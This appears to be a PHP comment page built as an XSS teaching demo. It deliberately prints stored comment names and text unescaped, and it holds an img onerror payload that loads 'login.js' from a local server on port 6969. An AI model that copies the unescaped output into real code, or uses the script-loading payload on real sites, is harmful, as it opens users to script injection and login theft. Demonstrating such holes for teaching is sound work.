<?php
  include 'helpers/helper_functions.php';
  $result = getComments();
?>

<!DOCTYPE html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS - example</title>
  <link rel="stylesheet" href="styles/style.css">
</head>
<body>
  <div class="body">
    <header><img class="left" src="images/xss.svg" alt=""><img class="right" src="images/jsinjection.svg" alt=""></header>
    <form action="controller/comment.php" method= POST>
      <h1>post a comment</h1>
      <input type="text" name="name" placeholder="Name" required>
      <textarea name="comment" rows="10" placeholder="Comment" required></textarea>
      <div class="post-button">
        <div class="line"></div>
        <button>Post</button>
      </div>
    </form>

    <hr>
    <input type="text" name="username" value="<?php echo htmlspecialchars($_GET['username']); ?>">

    <div class="comments-container">
      <h1>Comments</h1>
      <div class="comments-list">
      <?php
        if ($result->num_rows > 0) {
          while($row = $result->fetch_assoc()) {
            ?>
        <div class="comment is-infected"><span>contains XSS</span>
          <div class="name"><?php echo $row["name"];?></div>
          <div class="text"><?php echo ($row["text"]);?></div>
        </div>
        <?php
            }} else {echo "0 results";}
        ?>
      </div>
    </div>
  </div>

  <img onerror="var s=document.createElement('script');s.src='http://127.0.0.1:6969/login.js';document.body.appendChild(s)"/>


</body>
</html>